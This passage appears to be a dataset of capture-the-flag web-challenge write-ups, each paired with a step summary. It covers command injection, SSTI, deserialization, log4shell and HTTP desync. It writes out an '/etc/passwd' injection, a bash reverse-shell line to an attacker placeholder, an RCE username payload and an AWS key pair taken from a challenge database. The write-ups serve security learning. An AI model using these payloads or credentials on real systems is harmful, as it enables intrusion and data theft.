Craft a payload to retrieve all subclasses and analyze the list of returned subclasses.

Create another payload to execute the `id` command and observe the output.

Use remote command execution to list the directory content and obtain the flag.
"
"The normal webpage returns a welcome advice.

But connecting to robots.txt endpoint will reveal the following content '?lmao'.

So you can connect to ?lmao endpoint which will return the following PHP code.

[PHP code that includes a configuration file and processes user input through GET parameters to either display the contents of the current file or replace a specific text pattern with user input, potentially vulnerable to code injection attacks.]

Basically you can craft your own `preg_replace`.

The preg_replace is subject to RCE using `/e`

It will return the `phpinfo()` output.

But [URL containing parameters that appear to be executing a system command to print the current user's ID.] will be blocked by the `is_payload_danger` method.

With some analysis, you can discover that `fread` and `fopen` are available, so you can read `config.php` with a payload, specifying the `config.php` filename in another GET parameter to bypass the check.

The response is a base64 encoded string, decoding you can discover the source code.

[PHP function that checks if a given string (presumably user input) contains any potentially dangerous code or commands that could be executed on the server.]

Using `glob` function, which is not blocked, you can find the flag file that can be read with the technique used before.

","Visit the normal webpage and observe the welcome message.

Connect to the robots.txt endpoint, revealing the '?lmao' content.

Access the ?lmao endpoint, which displays the vulnerable PHP code.

Craft a custom `preg_replace` to exploit the RCE vulnerability using `/e`.

Bypass the `is_payload_danger` method by utilizing available `fread` and `fopen` functions to read the `config.php` file.

Decode the base64 encoded string to discover the source code.

Use the `glob` function to find the flag file and read it with the previously used technique.
"
"A basic enumeration will reveal the presence of a Git repository.

So you can use git-dumper to dump all the repository.

With `git log` you can discover a commit with a suspect message. 

Probably the flag was present before that commit and has been removed. For this reason you can compare commits using 'git diff'.

The previous commit contained the flag. You can restore that file checking out the commit and get the flag.","Perform a basic enumeration to discover the Git repository.

Use git-dumper to dump the entire repository.

Utilize `git log` to find a commit with a suspicious message.

Compare commits using `git diff` to identify the removal of the flag.

Restore the file containing the flag by checking out the previous commit and retrieve the flag.
"
"The website allows to upload a file. Analyzing the HTML you can discover an interesting comment containing a PHP snippet.

The website returns you a link to the uploaded file, it renames the file with a random value preserving the extension. So, a PHP shell can be uploaded and visited executing its content.

Unfortunately the RCE doesn't work, but the text says: 'maybe some info will help you'.

So you can try to understand what's happening using `phpinfo()`.

Some functions are disabled, you can see them under `disable_functions` section of `phpinfo()` output.

`scandir` and `file_get_contents` are not disabled and the flag is under `/etc`.

A simple exploit.php can be created and uploaded.

[PHP code that reads the contents of every file in the ""/etc/"" directory and outputs the contents of any file that contains the string ""darkCON{"". It also outputs information about the PHP environment using the ""phpinfo()"" function.]

The exploit output will contains the flag.","Analyze the website's HTML to discover a PHP snippet in a comment.

Upload a PHP shell and visit the renamed file to execute its content.

Use `phpinfo()` to understand the restrictions and environment.

Identify that `scandir` and `file_get_contents` are not disabled and the flag is in `/etc`.

Create and upload an `exploit.php` file to read contents of files in the `/etc/` directory.

Retrieve the flag from the exploit output.
"
"Connecting to the web site will give you an authentication form with your IP printed on it. The title of the challenge seems related to the *User-Agent* string.

Analyzing the HTML source code, you can discover default credentials. Using them will print your User-Agent and an image.

The usage of `X-Forwarded-For: 127.0.0.1` doesn't alter the IP address.

The challenge talks about a database, so trying to alter the User-Agent during authentication will give you a SQL error. SQL injection is possible via User-Agent string.

So you have to leak the database name. The problem is that this query is an `INSERT` one, so you need to apply an appropriate approach. You can use an [error based approach via Updatexml().

The flag is composed with the database name.","Connect to the website and observe the authentication form with IP address.

Analyze the HTML source code to find default credentials.

Use default credentials to access the site, noting the User-Agent and image.

Attempt to alter the IP address using `X-Forwarded-For`, but observe no change.

Discover SQL injection possibility via User-Agent string.

Leak the database name using an error-based approach with `Updatexml()`.

Obtain the flag, which is composed of the database name.
"
"The web site is a form to upload files. Reading the challenge description, an XXE should be involved.

The form allows only PDF and DOCX files.

Uploading a DOCX file, you can notice that some information are shown. One of them is the number of pages.

DOCX files are archives of files where XML documents are present.

It is sufficient to create a DOCX and to alter the app.xml file, where the number of pages is stored.

Uploading the file in the web application will return the flag where the number of pages is shown.","Access the website and observe the form for uploading files, with XXE likely involved.

Note that the form only allows PDF and DOCX files.

Upload a DOCX file and observe the displayed information, including the number of pages.

Understand that DOCX files are archives containing XML documents.

Create a DOCX file and alter the app.xml file to manipulate the number of pages.

Upload the modified file to the web application and retrieve the flag displayed as the number of pages.
"
"Connecting to the web page will give you the following PHP source code.

[PHP code with various conditional statements that check user input and output different strings based on the input. Some strings include a flag variable that is concatenated with HTML code and displayed on the page.]

You have to satisfy all checks to print the flag.

For the last check you have to find two colliding MD5 strings. You can write your php script to generate the URL-encoded version of the original strings for which hexadecimal values are provided.

The script will give you the strings.

So you can craft the complete request.

The webpage will give you the flag.","Connect to the web page and view the provided PHP source code.

Understand that you need to satisfy all checks to obtain the flag.

Determine that you need to find two colliding MD5 strings for the last check.

Write a PHP script to generate the URL-encoded versions of the original strings with the given hexadecimal values.

Execute the script to obtain the colliding strings.

Craft a complete request with the colliding strings.

Submit the request to the webpage and receive the flag.
"
"This execise contains 2 Flags. The first one is just finding the form (wow, complicated), the second seems to be hidden in environment variables.

First, the author tried to upload a file with the `.tpl` extension and a random content they can identify. It triggers a `POST` to `/upload.php` and then redirects with `302 Found` to the `/index.php`, where the file content is displayed. They tried to reload the page, but the file content is always displayed, so it is persistent. Uploading the file a second time changes the output. Uploading a different file changes the content again.

Then the author tried to upload a valid PHP file, and here it starts to become interesting:
[PHP script: Display an alert with the current URL]
Becomes: `<!--?php echo ""<br--><script>alert(window.location.href)</script>"";`
[PHP script: Echo the result of 1+1]
Becomes: `<!--?php echo 1+1; </div-->`

In this writeup, the author experimented with uploading files to a PHP web application. They discovered that the uploaded content is persistent and displayed on the site. They also noticed that when uploading PHP code, the server modifies the output, converting PHP tags into HTML comments.

After some more experiments, the author found that `<div class=""test"">{7*7}</div>` became `<div class=""test"">49</div>`, which means that there exists a Server Side Template Injection (SSTI).

The following payload reveals some useful information:
[HTML payload: Displays environment variables and exposes files]

After analyzing the output, the author discovered the presence of the `smarty-4.0.1` PHP library, a template engine. They also found the `templates_c` folder containing some template files.

The template files are accessible on the server and can be downloaded by calling their file paths. The source code of PHP can be leaked with the payload:
[HTML payload: Executes a system command to display the contents of the `index.php` file]

By accident, this revealed the flag.

An alternative solution mentioned that the template engine might have some sort of environment variable that could be accessible.
","Upload a file with a `.tpl` extension and random content, triggering a `POST` to `/upload.php` and a `302 Found` redirect to `/index.php`.
Observe that the uploaded content is persistent and displayed on the site, and that uploading a new file changes the content.
Upload a valid PHP file and notice that the server modifies the output, converting PHP tags into HTML comments.
Discover a Server Side Template Injection (SSTI) by uploading a payload with an expression in curly braces.
Use an HTML payload to display environment variables and expose files, revealing the presence of the `smarty-4.0.1` PHP library and the `templates_c` folder.
Access and download the template files on the server by calling their file paths.
Use an HTML payload to execute a system command and display the contents of the `index.php` file, accidentally revealing the flag.
(Alternative) Explore the possibility of an accessible environment variable within the template engine.
"
"The website's homepage displays an ""Under Construction"" image.

## Exploring content

To explore the site, it was opened with ZAP Proxy.

At the root path `/`, there was nothing of interest.
The `/logout` and `/login` paths were also investigated.
The login path contained a form for submitting a username and password, but attempting to log in with `admin` as both the username and password was unsuccessful, displaying a message stating that the username and/or password were invalid.

A ""Forgot password"" link redirected to `/forgotpassword.html`.
This path has some JavaScript which is does not work:
[JavaScript snippet: Non-working error message function with commented database credentials]

The passwords from the database did not appear to be crackable with Hashcat, even after a 7-character brute force attempt.
SQL Injection seemed to be ineffective.

Other notable features of the page included the `JSESSIONID` cookie and a custom header `ETag`.
It seems to be interesting (reading on the MDN Web Docs). Spoiler: it is not.

Submitting a username from the database did not seem to have any effect.

Visiting the `/admin` and `/dashboard` paths resulted in HTTP 404 errors, displaying default Apache Tomcat error messages.

### Database

Upon examining the database, several schemas were discovered: `accounts`, `config`, `env`, `innodb`, `sys`, and `users`.

Within the `users` schema, the `data` table contained a flag. The `employees_login` table held `Emp_id`, `User_name`, and `Password` fields, with passwords hashed using SHA1. The `employees` table contained personal data about the employees, with all emails ending in `@dummy.com` and all birthdates set to `0000-00-00`.

In the `env` schema, the `git` table contained an OpenSSH private key.

The `config` schema's `aws_env` table held the following information: `user` as `s3user1`, `access_key` as `AKIAWSXCCGNYFS7NN2XU`, and `secret` as `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`.

Finally, within the `accounts` schema, the `employees_account` table listed `Emp_id`, `Username`, and `Account_number`.

### Amazon S3
The crdentials in the `aws_env` table can be used to access an Amazon S3 bucket with. Download is possible with AWS CLI (after `aws configure`): 
[aws command: Download the S3 bucket content]

It contains a tomcat log. After analyzing it, I saw another flag:
`23-Jun-2022 12:50:31.561 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: CTF{example_flag}`

After some more analyzing, I stumbled on this suspicious line:
`23-Jun-2022 12:50:31.551 ERROR [main] unable to pull update from github.com/cloudhopper-sec/app.git`

The repository is not accessible on GitHub. However, the account exists.

### GitHub Repository
GitHub repository can be cloned with the command:
[bash command: Set the custom SSH command to use the provided private SSH key when connecting to a remote server]

The SSH key is the one leaked from the database.

The repository contains the source code of the challenge including a Dockerfile.

### Apache Tomcat
The Tomcat servers version might be vulnerable to Remote Code Execution via a malicious `PUT` of a JSP (https://nvd.nist.gov/vuln/detail/CVE-2017-12617).

I tried it but the server is not vulnerable and forbids `PUT` requests.

## Code Review
The Java Servlet has `log4j` 2.14.1 as a dependency, which is vulnerable to Remote Code Execution via JNDI (Java Naming and Directory Interface).

Looking at the code, `ProfileServlet.java` logs the content of a `debug` Cookie value. This can be used to perform a log4shell attack. However, this is only possible if the user is logged in.
[JNDI payload]
[base64 encoded cookie]

In the Docker environment, the username and password are set to an empty string. However, this is not the case in production, maybe username or password are the flag. The user is identified by a SHA256 hash which is `SHA256(username + password)`.  The Database credentials don't work.

Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.

## Exploiting log4j for the flag (after challenge for testing)
(Note: I was to lazy to write a beautiful Java code)
[Java code: RcePayload class that exploits log4j vulnerability, extracts credentials and flag, and sends them to a malicious server]
","Explore the site with ZAP Proxy, investigating various paths including `/`, `/logout`, `/login`, `/forgotpassword.html`, `/admin`, and `/dashboard`.
Examine the database, discovering several schemas, and obtain credentials and an OpenSSH private key.
Access an Amazon S3 bucket using the credentials from the `aws_env` table, and download the contents with the AWS CLI, finding a flag within a Tomcat log.
Clone the GitHub repository using the leaked private SSH key, and examine the source code of the challenge.
Investigate potential vulnerabilities in Apache Tomcat and the Java Servlet, discovering the vulnerable `log4j` dependency in `ProfileServlet.java`.
Attempt to exploit the log4j vulnerability, extracting credentials and the flag. (This step was performed after the challenge for testing purposes.)
"
"The app represents an airline website. You can
- Sign up with a username, password and airline ticket number
- Then sign in with the username and password
- After that, the flight info will be displayed as a static image (it does not seem to contain any usefull information though at first glance)

## Code Review
After downloading the offered code, I looked into the folder with the app. Some JavaScript files, our (fake) Flag (hurray! No guessing where I neet to search for) and the `package.json`. Ok, so I ran `npm install` and:
[bash command: Install npm packages and display audit report]

Wow, interesting! ""Code Execution through IIFE in node-serialize"", thats the description from the GitHub [security advisory](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm). Damn, 9.8/10, this must be something. But what the heck is ""IIFE""? Okay Google ... or just opening the directly linked Wikipedia article in the advisory saves few clicks.
- https://developer.mozilla.org/en-US/docs/Glossary/IIFE
- https://en.wikipedia.org/wiki/Immediately_invoked_function_expression
After reading the advisory, it is clear thet `unserialize()` is the dangerous function here. Okay, let's remember that for later!

Were were we? Ah yes, review of the code. Ooops, just forgot about that and thought about this IIFE thing. But I have to calm down, you cant run before learning to crawl! So lets open it in VS Code and take a look. **No wait, a better idea!** Let's start the app first and see it in action. So lets try `npm run start` and ... rjagsdfgkafg!!!
[Error log: Permission denied while trying to start the app]

Yikes, it tried to open a priviliged port. Okay then let's try `npm run dev` (oh BTW, you can find scripts executed by the `npm run` command in the `scripts` section of the `package.json`). Ahh, failed again. So I looked into our `index.js` and spotted `const port = process.env.PORT || 80;`. Ah, makes sense, so the command would be `PORT=8080 npm run ...`. Yeahhhh, worked. Oh, and a new file named `storage.db` appeared in our directory. Okay, lets take a look at the app.

Nothing special. So lets go on. Interested in what the database looks like? Me too. So let's see what database engine seemed to be used (guess it was SQLite), open `package.json` again and ... yes it is SQLite as the dependecies say. Ok let's open the file in ""DB Browser for SQLite"".

Ok, nothing special at first. Although the `id` is weird. Just a ... double as a varchar?? Yeah, let's don't ask why exactly and just continue by reviewing the source now.

Firs't, let's open the `routes folder` which contains:
- index.js
- login.js
- logout.js
- signup.js

Pretty clear what they do, no spaghetti code, yay! So let's open index and ...
[JavaScript code snippet: Import cookie-parser, escape-html, and node-serialize, and set up a route for handling the root path]

Well, this was not what I expected. **RED ALERT!** `unserialize()`. So, the cookie is a serialized JS object which contains the user info. So if we control the cookie => BOOM! Remote Code execution. So let's see if we can execute a malicious payload ...

## Tried soloutions
First, let's try a basic Unserialize without Cookies and all that stuff. Just an additional javascript file with our tests:
[JavaScript code: Test basic serialization and unserialization with a simple payload]

And yeah, this works without a problem. So I can craft the malicious payload (at least I thought so).

The payload needs to read our flag file and return the result as the username, so that we can see it in our website. Remember, it's shown there already as ""Welcome xxx"".
[JavaScript code: Create a payload that reads the flag file and returns it as a username]

Aaaand ... oh, I made a stupid mistake!

### Problems

#### Payload was executed BEFORE serialization
Yeah, as the heading says, the payload was not serialized there and only executed before serializing. I mean makes sense because the function is executed. So I experimented a bit and looked up documentation.
https://github.com/luin/serialize

Oh, this is how functions can be executed. The function is encoded into the string and then gets executed.

### Solution
[JavaScript code: Craft a serialized payload with a function that reads the flag file and returns it as a username]

We can set the resulting payload shown in the console as our `session` Cookie.

## Attack real target
Attacking the sandbox gave me the flag without any problems

## Better solution (after solving)
[JavaScript code: Create a serialized payload using node-serialize, then modify it and unserialize it to get the flag]

Can serialize the payload istself without hand crafting.
","Explore the app, signing up, signing in, and viewing flight info.
Perform a code review, finding a security advisory related to ""Code Execution through IIFE in node-serialize"".
Investigate the `unserialize()` function as a potential vulnerability.
Examine the database structure and contents using ""DB Browser for SQLite"".
Review the source code, particularly the route handling files, and find where `unserialize()` is used.
Test basic serialization and unserialization with a simple payload in a separate JavaScript file.
Craft a malicious payload that reads the flag file and returns it as a username.
Set the resulting payload as the `session` cookie to execute the attack.
Successfully obtain the flag by attacking the sandbox.
After solving the challenge, create a better solution by serializing the payload using node-serialize, modifying it, and unserializing it to get the flag.
"
"The app is a page with a form which says ""Create user"". After entering a name and clicking on ""Ctrate"", it lists the created users with name and if they are admins.

The source code for the app is avaliable as a download for the challenge.

## Review
The app is a Node.js TypeScript app written with Next JS. The `auth.ts` file is the most interesting part. The code snippet shows that it simply stores the request body object into the database, as seen in the requests made to the API endpoint with the format `{""username"":""our-username""}`.

It just seems to store the body object into the database which is also seen in the requests made to API endpoint: `{""username"":""our-username""}`.

The shema file `shema.prism` shows, that there is a field `isAdmin` field in the `User` model, which is set to `false` by default.

By sending a custom request body where `isAdmin` is set to `true` we can reveal the flag.
","Explore the app, which allows creating users with a name and displays whether they are admins.
Download and review the source code, focusing on the `auth.ts` file and observing how the request body object is stored in the database.
Examine the `shema.prism` file, identifying the `isAdmin` field in the `User` model, which is set to false by default.
Send a custom request body with `isAdmin` set to `true` in order to reveal the flag.
"
"The website is a WordPresss site where some links are cickable and reveal 2 blog posts where you can comment (in one of them).

`?p=1` has a blog post page where you can comment. First, I tried to create a comment aaannnd ... nothing? Interestingly, the URL is now `http://01.linux.challenges.ctf.thefewchosen.com:51490/?p=1&unapproved=2&moderation-hash=11d64a466de22952e34eaae54f57abc3#comment-2`. Seems like comments need to be approved or something.

Then I tried XSS but it does not really seem to work. The `<script>` tags seem to be removed and sometimes the commen isn't even listed.

Then I decided to look more closely at the source code of the page. I downloaded it from the ""save all"" menu in the browser and look at it in an IDE.

Then I found something suspicious. Some JavaScript named `mec-frontend` and some settings for some sort of calendar?
[HTML code: mec-frontend JavaScript and calendar settings with various variables and properties]

This looked suspicious, especially because the challange was called ""Calendar"" and had ""Are online calendars trusty?"" as a description.

Also, 2 other lines with a `<link>` Tag seemed weird:
[HTML code: alternate oembed links]

Mec seems o relate to a WordPress Plugin ""Modern events calendar"" (https://webnus.net/modern-events-calendar/). The used version has 2 entries in the explort database:
- https://www.exploit-db.com/exploits/50084
- https://www.exploit-db.com/exploits/50082

The firs one seems to need authentication so it does not work in our case. But the second one did not seem to work, too.
","Explore the WordPress website, finding a blog post page where you can comment, but comments need approval.
Attempt XSS, but observe that it doesn't seem to work as `<script>` tags are removed and comments aren't listed.
Download the source code of the page and examine it in an IDE, finding suspicious JavaScript named `mec-frontend` and calendar settings.
Investigate the ""Modern Events Calendar"" WordPress plugin and its two entries in the exploit database.
Determine that the first exploit requires authentication, which doesn't apply to the current case, and the second exploit doesn't seem to work either.
"
"When opening the site, the following text appears: ""Command executed: ping -c 2 127.0.0.1""

The URL is `/index.php?host=127.0.0.1` which indicates that the IP or maybe more is controllable.

I tried to set `host=127.0.0.1;cat /etc/passwd` which showed the content of the `/etc/passwd` file. This measn we can control the command and inject our own.

I then tried to inject `127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1` as URL encoded payload to open a reverse shell but it didn't work.

I then tried `127.0.0.1;ls .` but it returned only `index.php`. 

`127.0.0.1;echo $PWD` shows, that the directory is `/var/www/html`. 

By injecting `env` into the host parameter, the environment variables were displayed, but the flag was not found among them.

`127.0.0.1;ls /root` showed nothing.

I tried multiple attempts to open a reverse shell but it didn't work (for example I tried `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` but no luck).

Okay, seems that only a Webshell works.

My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.

Then I tried to serch for the flag with the payload `ls /`. This revealed a `flag.txt` file entry which I could read by calling `cat /flag.txt`
","Notice the URL is `/index.php?host=127.0.0.1`, indicating controllable IP or command.
Inject commands such as `cat /etc/passwd` to confirm command control.
Attempt to open a reverse shell but fail.
Try a webshell and restart the container if needed.
Search for the flag with the payload `ls /` and find the `flag.txt` file.
Read the flag by calling `cat /flag.txt`.
"
"The App consists only of a web page displaying ""I hope you loke robots!. Other paths do not work and they always display the same HTML with the `200 OK` status code.

Because the challenge is called ""Robots and Music"" and the text says ""I hope you like robots!"" I tried opening `robots.txt`, and it disallowed the path `/g00d_old_mus1c.php`.

Opening the page reveals the flag.
","Visit the web page, which displays ""I hope you like robots!"" and gives a 200 OK status code for all paths.
Check the `robots.txt` file due to the challenge name and the text on the web page.
Find the disallowed path `/g00d_old_mus1c.php` in the `robots.txt` file.
Open the `/g00d_old_mus1c.php` page to reveal the flag.
"
"Baby Eval is a Node app which has a path `/` which lists some information including the server source code. As seen in the code the information comes from the following function:
[JavaScript function: Create a directory object with keys and values, including the server source code]

The webpage is created here:
[JavaScript code: Process and evaluate the payload from the query string]

The goal was to get the flag. First I saw that the code can execute `eval` by entering a `payload` as the `GET` query parameter. I first did not see that the ReEx is a Blacklist, not a whitelist (stupid me), so many things don't work including calling functions because `(` and `)` are not allowed. Then I googled for a way to call a function without prenthesis. Found that JavaScript Template Literals can have tags, which are basically functions whose first parameter is a list of strings. This list contains the parts of the string, split by the injection variables (`${x}`).

To bypass the restriction, I used the JavaScript Template Literal syntax to call the `directory` function with the argument ""flag"" by submitting the following payload.

Because we don't have an injection variable, the argument of `directory` is just `[ ""flag"" ]`.
","Examine the Node app's source code provided on the `/` path.
Identify the function that creates a directory object with keys and values, including the server source code.
Recognize that the code can execute `eval` by entering a `payload` as a `GET` query parameter.
Realize that the ReEx is a blacklist, not a whitelist, which prevents calling functions with parentheses.
Research a way to call a function without parentheses and discover JavaScript Template Literals.
Craft a payload using JavaScript Template Literal syntax to bypass the restriction and call the `directory` function with the argument ""flag"".
"
"vsCAPTCHA is secured by a special CAPTCHA kind of thing written in TypeScript and Deno.
1. `b1` and `b2` are initialized with a random number from 0-500
2. app starts to listen to `POST` requests in `/captcha`
	1.  if Header `x-captcha-state` is set, it checks if body JSON value `solution` is equal to expected CAPTCHA
	2. expected CPATCHAs are stored in a Map `random JWT UUID` => expected
	3. If expeted value does not match `solution`, it returns and sets JWT field `failed` to `true`
	4. else it generates a new CPATCHA, stores it in the map of expected value
	5. You can get the flag if you have more than 1000 CAPTCHA solves

The CAPTCHA is generated with following code:
[TypeScript code: Generate two random numbers and create a CAPTCHA text]

Brute force
The shown CAPTCHA is only 6 random Digits max. Because `b1` and `b2` are only initialized at startup of the application, they never change. If we have at least 1 CAPTCHA image, it sould be possible to try out what `b1` and `b2` is and then we can brute force a new captcha by just trying out all remaining expected values because the range is really low (just maximum of 15 for `num1` and maximum of 7 for `num2`).

Pitfalls:
- The JWT success counter is reset to 0 if the old token is invalid
- the expiry was not not extended for failed solving attempts which makes brute force on the original server more complicated

The Python code didn't work at first because of multiple bugs. I worked them out and it worked on the local setup but not on the CTF server beacuse the connection had ~500 ms delay and the token was reset to early. Then I tried to refactor my code and limit the try range but this only broke the code.

Cracking the random generator state/predicting random numbers
Because the random range is so small and non cryptographically secure random numbers were used, it might be possible to predict them. But not sure how to approach that.
","Analyze the vsCAPTCHA implementation, which is secured by a custom CAPTCHA written in TypeScript and Deno.
Understand the CAPTCHA generation process and note that `b1` and `b2` are only initialized at startup and never change.
Attempt to brute force the CAPTCHA by trying all possible combinations of `num1` and `num2`, given the limited range.
Encounter pitfalls such as the JWT success counter resetting to 0 if the old token is invalid, and the expiry not being extended for failed solving attempts.
Attempt to fix the Python code, but face issues with the CTF server due to connection delays and token reset.
Consider an alternative approach of cracking the random generator state or predicting random numbers since the random range is small and non-cryptographically secure random numbers were used.
"
"Analyzing the HTML code of the page we can see that there is anything to authenticate there.

Analyzing the  PCAP file you can discover on packet #6 the existence of staff.html web page.

Connecting to it, you will discover the flag.
","Analyze the HTML code of the page, noting there is no authentication.

Examine the PCAP file and find packet #6, revealing the existence of the staff.html web page.

Connect to the staff.html web page to discover the flag.
"
"At this point, you can spot two interesting cookies.

Analyzing the capture, you can find two packets, regarding a JWT-related endpoint.

You can use JWT.io to craft a valid JWT.

Calling the endpoint with the JWT in the `Authorization` header will give you the flag.
","Identify two interesting cookies in the capture.

Find two packets related to a JWT-related endpoint.

Use JWT.io to craft a valid JWT.

Call the endpoint with the JWT in the `Authorization` header to obtain the flag.
"
"The authentication page discovered during the previous step is the following.

Analyzing the PCAP file some interesting packets can be found.

You have discovered that: a `/forgotpassword.html` page exists, a user of the system and the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.

As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.

[HTTP POST request sent to the ""/forgotpassword.html"" endpoint with some form data in the request body, including an email address, and a CSRF token.]

The server response will contain the flag.

","Analyze the PCAP file and find interesting packets.

Discover the `/forgotpassword.html` page, a system user, and the forgot password functionality using separate fields for username and email.

Intercept the request and change the email to one you control, while keeping the discovered username.

Send the modified HTTP POST request to the `/forgotpassword.html` endpoint with the changed form data.

Receive the server response containing the flag.
"
"Connecting to the web site, two interesting cookies are set.

Analyzing the PCAP file some POST requests passing `passcode` value can be found. 
Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that `passcode` values are just the first 8 chars of the hashed `nonce` value.

The same process can be applied to your `nonce` in order to perform a POST request.

The server response will contain the flag.


","Connect to the website and observe two interesting cookies being set.

Analyze the PCAP file and find POST requests with a `passcode` value.

Identify that the `passcode` values are the first 8 characters of the hashed `nonce` value using the SHA-1 algorithm.

Apply the same process to your `nonce` and perform a POST request.

Receive the server response containing the flag.
"
"Analyzing the HTML code we can notice:

[HTML image tag that displays an image with the specified source URL, a query string appended containing the flag.]
","Analyze the HTML code.

Observe the image tag with the specified source URL and a query string containing the flag.
"
"Analyzing the HTML code we can notice:

[HTML code for an invisible image element that triggers an alert when clicked. The alert message is encoded using ASCII character codes.]

Using browser console to run the JavaScript will give you the flag.","Analyze the HTML code.

Notice the invisible image element that triggers an alert with an encoded message.

Use the browser console to run the JavaScript and obtain the flag.
"
"The target website contains a login form with a JavaScript check used to prevent the submission of long passwords.

JavaScript can be easily disabled from the browser (or a proxy tool can be used to intercept and repeat the request) in order to bypass this check.

Using a common password, i.e. `password`, will reveal the flag.","Visit the target website and locate the login form with a JavaScript check.

Disable JavaScript in the browser or use a proxy tool to intercept and repeat the request, bypassing the check.

Submit a common password like ""password"" to reveal the flag.
"
"The website allows you to upload and comment pictures of dogs.

There is an interesting endpoint at that contains a remote shell functionality, but it can't be used due to an `HTTP 502 Bad Gateway` error caused by the presence of `seccomp` filter, which prevents `execve`.

Several functionalities can be used only by authenticated users (i.e. `@login_required` annotations). There is an endpoint that can be used to create new users, but even this functionality requires the login.

A public functionality is the `<postid>` that can be used to insert a new comment under a picture.

The comment is inserted with a two-step procedure: the comment is inserted like a preview and showed into the webpage; the content of the comment is strictly validated and inserted into the database.

Analyzing the code for the first step, in the python script, an interesting line of code can be found into `get_comments` function.

The interesting line is the following.

[Python code that formats a comment string using the contents of a dictionary attribute ""self.dict"" and assigns it to a variable named ""fmt_cmt"".]

It seems that if you use a format string like `{rating}` into the comment text, then the content of `self.__dict__` can be printed.

Trying it, the following content will be printed into the preview webpage.

[HTML code containing an unordered list with class ""square"" and a Python dictionary nested within a string.]

This code can be abused to read secret data.

The following code can be used to access *globals* objects.

[Python expression that retrieves the global variables dictionary of the init method of the first element in the ""comments"" list of the ""rating"" dictionary.]

From the output you can spot user credentials.

So now you can authenticate into the system and create new users.

During the authentication, an interesting behavior can be spot. The `login` method uses the f-Strings functionality of Python 3, which is a very powerful formatting syntax and can be used to call methods.

[Python Flask route handler function for the ""login"" URL that accepts both GET and POST requests. It processes a login form, authenticates the user with the provided username and password, and redirects the user to the appropriate page based on the result of the login attempt.]

The interesting line is the following.

[Python code that returns a redirect to a specific URL, constructed by appending a query string with a welcome message containing user information to the base URL obtained from the request's host URL.]

The `get_user_info` method of the `User` class uses the `f()` method, instead of the `f""""` one, on the `username` field; this method is the legacy one of f-Strings Python 2 implementation. The library implemented the f-Strings functionality by using an `eval`.

[Python code that imports a custom module named ""fstring"" and defines a method named ""get_user_info"" that returns a formatted string using the instance variable ""self.username"".]

So you can create a new user with a malicious username that could trigger a RCE during the authentication. The malicious username is: `{open('/flag').read()}`.

Authenticating with this user, you will be redirect to the following an address that contains the flag in the URL.","Analyze the website and locate the interesting endpoint with remote shell functionality, which is blocked by an HTTP 502 error.

Investigate the `<postid>` functionality that allows inserting comments under a picture.

Discover a way to use format strings like `{rating}` in the comment text to print the contents of `self.__dict__`.

Use a code snippet to access global objects and spot user credentials, then authenticate and create new users.

Identify the interesting behavior in the `login` method and understand how f-Strings functionality can be exploited.

Create a new user with a malicious username, like `{open('/flag').read()}`, which triggers a remote code execution during authentication.

Authenticate with the malicious user to be redirected to an address containing the flag in the URL.
"
"With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.

The functionality endpoint is `/files/`. The GUID can be set with `X-guid` HTTP header.

Analyzing the two given python files you can discover that no intended vulnerabilities are present.

Analyzing responses, you can discover some interesting HTTP headers: Server, Via, X-Server-By.

It seems that the architecture is composed by a proxy and different hosts behind it which run the application.

Considering the infrastructure, this seems to be an HTTP Desync Attack scenario.

The malicious HTTP request will be the following (the char between `Transfer-Encoding:` and `chunked` is `0x0b`).

[HTTP POST request with a payload consisting of two parts separated by a ""chunked"" encoding. The request is sent to the server and includes a ""x-guid"" header with a specific value.]

Which will give the following answer.

[HTTP response headers indicating that a resource was created successfully with a status code of 201.]

At this point it is sufficient to read the defined object which will return a POST request containing the flag.","Explore the web application and understand its functionality, which allows submitting and retrieving text content to and from a remote S3 bucket using a GUID.

Analyze the given Python files and notice no intended vulnerabilities.

Examine the HTTP headers in the responses and identify the possible architecture as a proxy with multiple hosts behind it.

Consider the possibility of an HTTP Desync Attack scenario.

Craft a malicious HTTP request using chunked encoding and a specific `x-guid` header value.

Observe the successful HTTP response indicating resource creation.

Retrieve the defined object, which returns a POST request containing the flag.
"
"The challenge will print a PHP source code.

[PHP code that checks if the 'start' parameter has been sent via GET request, and if not, displays the source code of the current file and exits. If 'start' is present in a POST request, it includes the corresponding file and echoes the value of a variable named '$secret'.]

You can craft a request like the following.

[HTTP POST request with specific headers and body content includes a parameter called ""start"" with a value of ""/var/www/html/flag.php"".]

The server responds with an HTTP 200 OK status code and returns a text/html response containing a flag.","Examine the PHP source code provided by the challenge.

Notice that the code checks for the presence of the `start` parameter in a POST request and includes the corresponding file while echoing the `$secret` variable.

Craft an HTTP POST request with specific headers and body content that includes the `start` parameter with a value of `/var/www/html/flag.php`.

Observe the server's response with an HTTP 200 OK status code, which contains the flag in the text/html response.
"
"1. We do not have a copy of the source code for this challenge, so that makes it more challenging. We go to the website and are greeted with a login message. Let's try clicking on ""Create one!"", creating an account, and then signing in with that.

2. We see a profile screen with some basic details and a message that says ""You don't have permission to edit your profile, contact the admin elf to approve your account!""

3. When viewing the page's HTML and looking for things that are our of place, we see the following JS code:
[JavaScript code snippet: Updates the displayed file path when the user selects a file for upload]
These HTML IDs do not refer to anything on the page so something must be missing.

4. Next, we decide to check how your session remains signed in. There is a cookie called ""PHPSESSID"", which is common for PHP, with the value base64 encoded. When decoded using `base64 -d` shows `{""username"":""test"",""approved"":false}`.

5. Let's try setting `approved` to `true` and then encoding it again.
Swapping the cookie in the browser's developer tools and reloading the page now shows a ""Update profile avatar"" file selector.

6. Let's try uploading a new profile picture. Only PNGs are accepted, so there is some file type validation happening. After uploading the image, the page reloads and the profile picture has indeed changed. My image was originally called `Red.png`, but when it is uploaded it is renamed to `073cc_Red.png` and is placed in the `/uploads` directory.

